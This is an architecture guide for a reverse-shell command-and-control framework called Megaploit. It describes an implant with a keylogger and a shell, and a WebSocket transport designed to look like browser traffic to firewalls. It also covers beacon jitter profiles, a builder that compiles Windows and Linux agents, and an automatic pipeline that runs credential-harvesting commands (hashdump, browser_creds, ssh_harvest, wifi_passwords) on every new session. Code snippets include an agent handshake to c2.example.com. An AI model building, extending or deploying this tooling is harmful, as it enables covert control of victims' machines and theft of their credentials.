# Megaploit Architecture Guide

## Overview

Megaploit is a reverse-shell C2 framework. The **server** runs on the operator machine; the **agent** runs on the target. Communication flows over a persistent TCP connection initiated by the agent (no inbound firewall rule needed on the target).

```
Operator Machine                      Target Machine
┌─────────────────────────────┐       ┌──────────────────────┐
│  server.py                  │       │  agent.py / agent_go │
│  ├── Console (cli.py)       │◄──────│  ├── connection.py   │
│  ├── Listener               │TCP/WS │  ├── handlers.py     │
│  ├── Sessions               │AES-GCM│  ├── keylogger.py    │
│  ├── Pipeline               │       │  └── shell.py        │
│  ├── Module Registry        │       └──────────────────────┘
│  ├── Payload Builder        │
│  ├── C2 Profile             │
│  ├── Web Dashboard          │
│  └── RPC Server             │
└─────────────────────────────┘
```

---

## Component Deep-Dives

### `megaploit/core/protocol.py` — Transport v2 + WebSocket

The protocol operates in two layers:

**Layer 1 — Framing**
```
[ uint32 length (4 bytes, big-endian) ][ payload bytes ]
```
`struct.pack("!I", len)` — no sentinel, binary-safe.

**Layer 2 — Encryption**

When `cryptography` is installed:
- `send_msg(conn, data)` → encrypts `data` with AES-256-GCM (random 12-byte IV), prepends sequence number, frames with length prefix
- `recv_msg(conn)` → reads length, decrypts, validates sequence number (rejects replays)

When `cryptography` is absent:
- XOR-CTR fallback with per-session random key

**Handshake sequence** (`handshake_server` / `handshake_agent`):
1. HMAC challenge-response (in `crypto.py`)
2. Protocol version byte exchange (`0x02`)
3. AES session key generation and exchange

**State management**: `get_state(conn_fd)` / `set_state(conn_fd, state)` / `remove_state(conn_fd)` — keeps per-connection cipher state in a module-level dict, thread-safe with `threading.Lock`.

---

### `WsTransport` — RFC 6455 WebSocket Layer (NEW v3)

`WsTransport` wraps a raw TCP socket with a full WebSocket handshake and binary frame protocol. This allows agents to communicate over port 80/443 while appearing as browser traffic to perimeter firewalls.

```python
from megaploit.core.protocol import WsTransport

# Server side
ws = WsTransport(conn, server_side=True)
ws.handshake()       # reads HTTP Upgrade request, sends 101 response
data = ws.recv()     # reads one binary frame
ws.send(b"data")     # sends one binary frame (unmasked, server→client)

# Client/agent side
ws = WsTransport(conn, server_side=False)
ws.handshake(host="c2.example.com", path="/updates")
ws.send(b"data")     # sends masked binary frame (RFC 6455 client requirement)
data = ws.recv()
```

**Frame structure** (RFC 6455 §5.2):
```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
├─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─────────────────────────────┤
│F│R│R│R│ opcode  │M│  payload length  │   extended length...    │
│I│S│S│S│         │a│   (7 or 7+16     │   (0, 16, or 64 bits)   │
│N│V│V│V│         │s│    or 7+64)      │                         │
│ │1│2│3│         │k│                  │                         │
├─────────────────┴─┴──────────────────┴─────────────────────────┤
│                    masking key (4 bytes, if masked)             │
├─────────────────────────────────────────────────────────────────┤
│                       payload data                              │
└─────────────────────────────────────────────────────────────────┘
```

Ping/pong frames are handled transparently inside `recv()`. CLOSE frames raise `ConnectionError`.

---

### `megaploit/server/listener.py` — Connection Lifecycle

Five hardening layers per connection (in order):

```
TCP Accept
    ↓
1. IP Allowlist check    — drop if not in allowed_ips (if configured)
    ↓
2. Rate limiter          — sliding window 5 attempts / 60s; auto-ban 300s
    ↓
3. TLS upgrade           — wrap socket in SSLContext (if configured)
    ↓
4. HMAC auth             — challenge-response, drop on failure
    ↓
5. Protocol handshake    — AES-256-GCM setup
    ↓
Session created → on_session(session) callback → Console._on_new_session()
```

All events written to `loot/audit.log` with UTC timestamps.

---

### `megaploit/server/session.py` — Session Dataclass

```python
@dataclass
class Session:
    conn:         socket.socket
    ip:           str
    port:         int
    id:           int             # Sequential, monotonically increasing
    connected_at: float           # Unix timestamp
    tag:          str             # Operator-set label
    notes:        list[str]       # Operator notes (also synced via RPC)
    os_name:      str             # Populated by sysinfo/os_info
    hostname:     str
    username:     str
```

Helper methods: `loot_dir()`, `screenshot_path()`, `recording_path()`, `download_path(name)`, `uptime` (property), `to_dict()` (used by web API and RPC).

---

### `megaploit/server/commands.py` — Command Registry

```python
@_cmd("name", usage="...", help_text="...", dangerous=False)
def cmd_name(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, json.dumps({"cmd": "name", "args": args}))
    return _ok(recv_msg(session.conn))
```

`dispatch(session, raw_input)` → parses → looks up command → calls handler → returns `CommandResult(ok, output, close_session)`.

---

### `megaploit/modules/base.py` — Module Lifecycle

```
Module instantiation
    ↓
_define_options()    ← called from __init__; register options with _opt()
    ↓
set(key, value)      ← operator sets options (with type validation)
    ↓
validate()           ← raises ModuleError if required options missing
    ↓
check()              ← optional: light probe, no state change
    ↓
run(session=None)    ← main execution; emits results via _ok()/_fail()
    ↓
results              ← list[ModuleResult]
```

**Option types:** `string`, `integer`, `boolean`, `address`, `cidr`, `port`, `enum`

---

### `AgentModule` — Session-Bound Post Module Base (NEW v3)

`AgentModule` extends `Module` with helpers that route through the dispatcher:

```
AgentModule.__init__()
    ├── super().__init__()       ← standard Module init
    └── self.session = None      ← console sets this before run()

_send(cmd, session=None)
    ├── sess = session or self.session
    ├── if sess is None → raise ModuleError
    └── dispatch(sess, cmd) → CommandResult → return result.output

_shell / _upload / _download → thin wrappers around _send
```

The console sets `module.session = active_session` before calling `module.run()` so modules don't need to receive it as a parameter.

---

### `megaploit/core/pipeline.py` — Post-Exploitation Pipeline (NEW v3)

```
Pipeline.__init__()
    ├── self._autorun = AutoRunScript()
    ├── self._active_profiles = set()
    └── self._lock = threading.Lock()

commands_for(session)
    ├── base = self._autorun.commands_for(session)    ← autorun baseline
    ├── for profile in sorted(self._active_profiles):
    │       for cmd in _PROFILES[profile]:
    │           if cmd not in seen: extra.append(cmd)
    └── return base + extra                           ← deduplicated

Console._on_new_session(session)
    └── cmds = _pipeline.commands_for(session)
        └── threading.Thread → dispatch each cmd after 0.5s delay
```

Built-in profiles (`_PROFILES` dict):

| Profile | Commands |
|---|---|
| `basic` | sysinfo, whoami, pwd, env |
| `creds` | hashdump, wifi_passwords, browser_creds, ssh_harvest, cred_vault |
| `recon` | ps, installed_software, scheduled_tasks, users, os_info |
| `network` | arp, netstat, ifconfig, hosts_file |
| `full` | Union of all above |

---

### `megaploit/core/profile.py` — Malleable C2 Profile (NEW v3)

```
C2Profile dataclass
    ├── name / description
    ├── sleep / jitter_max            ← beacon timing
    ├── uri_paths: list[str]          ← URI rotation pool
    ├── request_headers: dict         ← injected into every request
    ├── response_headers: dict        ← returned by server
    ├── user_agent: str
    └── metadata_prepend/append/location

next_uri()              → random choice from uri_paths
uri_cycle()             → infinite random-shuffle generator
sleep_with_jitter()     → float: sleep + uniform(0, jitter_max)
build_http_headers()    → merged dict with User-Agent fallback
to_dict()               → serialisable dict for export

load_profile(path: str) → C2Profile
    ├── read file
    ├── try yaml.safe_load() → if ImportError:
    │       json.loads()
    └── _from_dict(data) → C2Profile
```

---

### `megaploit/payload/builder.py` — Build Pipeline

```
BuildConfig(lhost, lport, format, use_tls, secret_key, encoders, ...)
    ↓
PayloadBuilder.build(config)
    ├── _render(config)          → raw bytes (agent source or dropper)
    │   └── GO_EXE / GO_ELF → returns Python agent src (unused by _compile_go)
    ├── _apply_encoders(data)    → pipe through encoder chain
    └── _write_or_compile(data)
        ├── GO_EXE / GO_ELF  → _compile_go(cfg)    ← NEW v3
        ├── EXE / ELF        → _compile_binary(data, cfg, sha)
        └── others           → write to disk or return in-memory
    ↓
BuildResult(ok, data, output_path, size, sha256, build_time_s)
```

**`_compile_go(cfg)`** flow:
```
1. shutil.which("go") → fail if absent
2. locate megaploit/agent/go_agent/ → fail if missing
3. build ldflags: "-X main.LHOST=… -X main.PORT=… -X main.SECRET=…"
4. set GOOS=windows (go_exe) or GOOS=linux (go_elf), GOARCH=amd64
5. subprocess.check_call(["go", "build", "-ldflags=…", "-o", out, "."])
6. copy binary to cfg.output_path or cwd
7. return BuildResult with sha256 + size
```

---

### `megaploit/web/app.py` — Web Dashboard Architecture

```
WebServer.start()
    └── threading.Thread → Flask app.run(threaded=True)

Routes:
  GET  /                    → embedded HTML dashboard (no external assets)
  GET  /api/*               → JSON REST endpoints
  POST /api/sessions/<id>/cmd → dispatch command, return result
  GET  /events              → SSE stream (text/event-stream)

SSE mechanism:
  _subscribers = list[queue.Queue]
  GET /events → register sub_q → yield from sub_q with 20s timeout
  _broadcast(type, message) → put to all sub_q

Auth: X-API-Key header or ?apikey= query param
```

---

### `megaploit/web/rpc.py` — Multi-Operator RPC Architecture

```
RpcServer._accept_loop()
    └── TCP accept → Operator(conn_id, sock, addr)
        └── threading.Thread → _handle_operator(op)
            └── buf += sock.recv() → split on \n → _dispatch(op, line)
                └── json.loads → method lookup → handler → send result

Broadcast:
  _broadcast_notification(method, params, exclude=conn_id)
  → iterates _operators.values() → op.send_notification()
```

JSON-RPC 2.0 over raw TCP, newline-delimited.

---

### `megaploit/core/autorun.py` — AutoRunScript

Config file `~/.megaploit_autorun.json` is loaded at startup.

Resolution order per session:
1. `config["global"]` — always included
2. `config[platform_key]` where `platform_key ∈ {windows, linux, darwin}` and matches `session.os_name.lower()`
3. `config["tags"][session.tag]` — if tag matches

The `Pipeline` class wraps `AutoRunScript` and adds named profiles on top.

Hook in `Console._on_new_session()`:
```python
cmds = _pipeline.commands_for(session)   # autorun + active profiles
threading.Thread(target=lambda: [dispatch(s, c) for c in cmds]).start()
```

---

### `megaploit/db/database.py` — SQLite Engine

Tables:
- `hosts` — IP, hostname, OS, notes, first/last seen
- `services` — host_id, port, protocol, service name, version, banner
- `credentials` — host, username, secret, cred_type, source
- `notes` — session_id, text, timestamp
- `loot` — session_id, file path, description, size
- `jobs` — name, status, started, finished, result
- `engagements` — name, description, start_time

The singleton `db` is imported as `from megaploit.db.database import db`.

---

## Thread Safety

| Object | Guard |
|---|---|
| `Console._sessions` | `Console._sessions_lock` |
| Protocol state dict | `threading.Lock` in `protocol.py` |
| `PluginLoader._plugins` | `threading.Lock` in `loader.py` |
| `RpcServer._operators` | `RpcServer._op_lock` |
| `JobManager._jobs` | `JobManager._lock` |
| `Pipeline._active_profiles` | `Pipeline._lock` |
| `_CommandHistory._buf` | `_CommandHistory._lock` |

---

## File Layout — Key Paths

| Path | Purpose |
|---|---|
| `secret.key` | 64-char hex HMAC secret |
| `loot/audit.log` | Connection + command audit trail |
| `loot/<session_id>/` | Per-session loot directory |
| `tools/tools.json` | Persistent toolbox catalogue |
| `~/.megaploit.json` | Operator settings (lhost, port, aliases, etc.) |
| `~/.megaploit_history.json` | Command history (500 entries) |
| `~/.megaploit_autorun.json` | AutoRunScript config |
